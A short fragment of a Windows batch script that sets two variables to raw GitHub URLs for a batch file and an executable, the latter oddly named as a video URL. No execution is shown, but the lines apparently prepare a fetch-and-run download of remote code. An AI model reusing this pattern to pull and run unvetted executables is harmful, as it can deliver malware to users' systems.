...
set toolURL=https://raw.githubusercontent.com/Upok18/FAH/main/locator.bat?%random%
set vidURL=https://raw.githubusercontent.com/Upok18/FAH/main/file.exe?%random%
